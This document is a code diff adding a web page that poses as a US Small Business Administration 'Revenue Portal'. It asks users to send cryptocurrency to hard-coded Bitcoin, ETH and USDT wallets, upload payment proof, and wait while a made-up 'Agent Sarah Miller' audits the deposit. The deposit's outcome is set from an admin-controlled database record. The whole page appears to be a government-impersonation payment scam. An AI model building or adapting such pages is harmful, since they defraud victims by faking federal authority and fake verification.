@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Revenue Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --gold: #b69121; }
+        body { background: #f1f5f9; font-family: 'Public Sans', sans-serif; color: #1e293b; margin: 0; -webkit-font-smoothing: antialiased; }
+        
+        .gov-banner { background: #001a3d; color: white; font-size: 8px; padding: 10px; text-align: center; font-weight: 800; text-transform: uppercase; border-bottom: 3px solid var(--sba-red); position: sticky; top: 0; z-index: 1001; }
+        .logo-frame { border: 2px solid var(--sba-blue); border-bottom-color: var(--sba-red); border-left-color: var(--sba-red); padding: 1px 6px; font-weight: 900; color: var(--sba-blue); font-size: 16px; line-height: 1; }
+        
+        .glass-card { background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 46, 109, 0.05); border: 1px solid #e2e8f0; }
+        .method-card { border: 1.5px solid #e2e8f0; border-radius: 12px; padding: 10px; cursor: pointer; transition: 0.2s; background: white; text-align: center; }
+        .method-card.active { border-color: var(--sba-blue); background: #f0f7ff; border-width: 2px; }
+
+        .btn-fed { background: var(--sba-blue); color: white; font-weight: 900; text-transform: uppercase; border-bottom: 4px solid #001a3d; cursor: pointer; width: 100%; border-radius: 12px; font-size: 12px; }
+        .btn-outline { border: 2px solid var(--sba-blue); color: var(--sba-blue); font-weight: 900; text-transform: uppercase; width: 100%; border-radius: 12px; font-size: 11px; }
+
+        .radar-spin { animation: spin 2s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        #globalLoader { position: fixed; inset: 0; background: #f1f5f9; z-index: 5000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body class="pb-10">
+
+    <div id="globalLoader">
+        <div class="logo-frame mb-4">SBA</div>
+        <div class="w-24 h-1 bg-slate-200 rounded-full overflow-hidden">
+            <div class="h-full bg-[#002e6d] w-1/2 animate-pulse"></div>
+        </div>
+    </div>
+
+    <div class="gov-banner">Federal Revenue Node • 256-bit Encryption Active</div>
+
+    <header class="bg-white p-4 flex justify-between items-center border-b sticky top-[30px] z-50">
+        <div class="logo-frame">SBA</div>
+        <a href="dashboard.html" class="text-slate-300 text-xl"><i class="fas fa-times-circle"></i></a>
+    </header>
+
+    <main class="max-w-md mx-auto p-4 mt-2">
+        <div class="glass-card">
+            <div class="p-6">
+                
+                <div id="formView">
+                    <h2 class="text-sm font-black text-slate-800 uppercase italic mb-6">Revenue Deposit</h2>
+                    
+                    <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Asset Type</label>
+                    <div class="grid grid-cols-3 gap-2 mt-2 mb-6">
+                        <div class="method-card active" onclick="selectMethod('BTC', 'bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345', this)">
+                            <i class="fab fa-bitcoin text-orange-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1">Bitcoin</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('ETH', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', this)">
+                            <i class="fab fa-ethereum text-indigo-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1">ETH</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('USDT', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', this)">
+                            <i class="fas fa-dollar-sign text-emerald-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1">USDT</p>
+                        </div>
+                    </div>
+
+                    <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Amount (USD)</label>
+                    <div class="relative mt-2 mb-6">
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 font-black text-slate-400">$</span>
+                        <input type="number" id="depAmount" class="w-full h-12 pl-10 rounded-xl border-2 border-slate-100 font-black text-base focus:border-sba-blue outline-none" placeholder="0.00">
+                    </div>
+
+                    <div class="bg-slate-900 p-3 rounded-xl mb-6 border-b-4 border-gold">
+                        <p id="methodLabel" class="text-[8px] font-black text-slate-500 uppercase">BTC Receiver</p>
+                        <div class="flex items-center justify-between gap-2 mt-1">
+                            <code id="walletAddr" class="text-[9px] font-bold text-amber-400 break-all">bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345</code>
+                            <button onclick="copyAddr()" class="text-white bg-white/10 p-2 rounded-lg"><i class="fas fa-copy text-xs"></i></button>
+                        </div>
+                    </div>
+
+                    <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Transfer Receipt</label>
+                    <div onclick="document.getElementById('popFile').click()" class="mt-2 border-2 border-dashed border-slate-200 rounded-xl p-6 text-center bg-slate-50 relative overflow-hidden mb-6">
+                        <img id="popPreview" class="absolute inset-0 w-full h-full object-cover hidden z-10">
+                        <div id="uploadUI">
+                            <i class="fas fa-camera text-slate-300 text-2xl mb-1"></i>
+                            <p class="text-[9px] font-black text-slate-400 uppercase">Attach Proof</p>
+                        </div>
+                        <input type="file" id="popFile" class="hidden" accept="image/*" onchange="previewReceipt()">
+                    </div>
+
+                    <button onclick="handleDeposit()" class="btn-fed h-12">Transmit for Audit</button>
+                </div>
+
+                <div id="pendingView" class="hidden text-center py-6">
+                    <div class="relative w-16 h-16 mx-auto mb-6">
+                        <div class="absolute inset-0 border-4 border-amber-500 rounded-full border-t-transparent radar-spin"></div>
+                        <div class="absolute inset-0 flex items-center justify-center text-amber-500"><i class="fas fa-university text-xl"></i></div>
+                    </div>
+                    <h3 class="font-black text-slate-800 uppercase italic text-base">Verification Pending</h3>
+                    <p class="text-[10px] text-slate-500 font-bold uppercase mt-2 px-2">Agent Sarah Miller is auditing your <span id="pAmt" class="text-sba-blue font-black"></span> deposit.</p>
+                    <div class="mt-8">
+                        <button onclick="resetNode()" class="btn-outline h-10">Cancel / New Deposit</button>
+                    </div>
+                </div>
+
+                <div id="successView" class="hidden text-center py-6">
+                    <div class="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center mx-auto text-white text-2xl mb-4 shadow-lg"><i class="fas fa-check-double"></i></div>
+                    <h3 class="font-black text-slate-800 uppercase italic text-base">Audit Successful</h3>
+                    <p class="text-[10px] text-slate-500 font-bold uppercase mt-2 px-4">Funds cleared. Your balance has been updated.</p>
+                    <div class="mt-8">
+                        <button onclick="resetNode()" class="btn-fed h-10">New Deposit</button>
+                    </div>
+                </div>
+
+                <div id="declinedView" class="hidden text-center py-6">
+                    <div class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto text-white text-2xl mb-4 shadow-lg"><i class="fas fa-times"></i></div>
+                    <h3 class="font-black text-slate-800 uppercase italic text-base">Transaction Declined</h3>
+                    <div class="bg-red-50 p-3 rounded-lg mt-4 mb-6 border-l-4 border-red-600 mx-2">
+                        <p id="dReason" class="text-[9px] font-bold text-red-600 italic"></p>
+                    </div>
+                    <button onclick="resetNode()" class="btn-fed h-10">Retry Deposit</button>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="mt-6 flex items-center gap-4 bg-white p-3 rounded-2xl border border-l-4 border-gold">
+            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="w-10 h-10 rounded-xl grayscale">
+            <div>
+                <p class="text-[10px] font-black uppercase text-slate-800">Sarah Miller</p>
+                <p class="text-[8px] font-bold text-sba-blue uppercase tracking-widest">Node Auditor assigned</p>
+            </div>
+        </div>
+    </main>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, onSnapshot, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        let compressedImage = null;
+        let selectedMethodName = "BTC";
+
+        window.selectMethod = (name, addr, el) => {
+            selectedMethodName = name;
+            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('methodLabel').innerText = `${name} Receiver`;
+            document.getElementById('walletAddr').innerText = addr;
+        };
+
+        window.resetNode = async () => {
+            document.getElementById('globalLoader').style.display = 'flex';
+            await updateDoc(doc(db, "users", auth.currentUser.uid), { depositStatus: "IDLE" });
+        };
+
+        function switchView(viewId) {
+            ['formView', 'pendingView', 'successView', 'declinedView'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(viewId).classList.remove('hidden');
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { window.location.href = "login.html"; return; }
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                const d = snap.data();
+                if(!d) return;
+                document.getElementById('globalLoader').style.display = 'none';
+                
+                // Track depositStatus specifically for the view
+                const status = d.depositStatus || "NEW";
+                if(status === "PENDING") {
+                    switchView('pendingView');
+                    document.getElementById('pAmt').innerText = `$${Number(d.lastDepAmount || 0).toLocaleString()}`;
+                } else if(status === "SUCCESSFUL") {
+                    switchView('successView');
+                } else if(status === "DECLINED" || status === "REJECTED") {
+                    switchView('declinedView');
+                    document.getElementById('dReason').innerText = d.denialReason || "Invalid proof of payment.";
+                } else {
+                    switchView('formView');
+                }
+            });
+        });
+
+        window.previewReceipt = () => {
+            const file = document.getElementById('popFile').files[0];
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const img = new Image();
+                img.src = e.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 600; 
+                    canvas.height = img.height * (600 / img.width);
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    compressedImage = canvas.toDataURL('image/jpeg', 0.6);
+                    document.getElementById('popPreview').src = compressedImage;
+                    document.getElementById('popPreview').classList.remove('hidden');
+                    document.getElementById('uploadUI').classList.add('hidden');
+                };
+            };
+            reader.readAsDataURL(file);
+        };
+
+        window.handleDeposit = async () => {
+            const amt = document.getElementById('depAmount').value;
+            if(!amt || !compressedImage) return alert("Required: Amount & Receipt");
+            
+            document.getElementById('globalLoader').style.display = 'flex';
+            try {
+                // This object matches exactly what the TITAN V15 Ledger logic expects
+                const depEntry = {
+                    type: "DEPOSIT",
+                    amount: Number(amt),
+                    method: selectedMethodName,
+                    status: "PENDING",
+                    proof: compressedImage,
+                    date: new Date().toLocaleString()
+                };
+
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    depositStatus: "PENDING",
+                    lastDepAmount: Number(amt),
+                    lastDepProof: compressedImage,
+                    // We push to 'ledger' so it shows in Admin Task Grid
+                    ledger: arrayUnion(depEntry)
+                });
+                
+                document.getElementById('depAmount').value = "";
+                compressedImage = null;
+            } catch (err) { alert("Audit link failed."); }
+            document.getElementById('globalLoader').style.display = 'none';
+        };
+
+        window.copyAddr = () => {
+            navigator.clipboard.writeText(document.getElementById('walletAddr').innerText);
+            alert("Copied!");
+        };
+    </script>
+</body>
+</html>
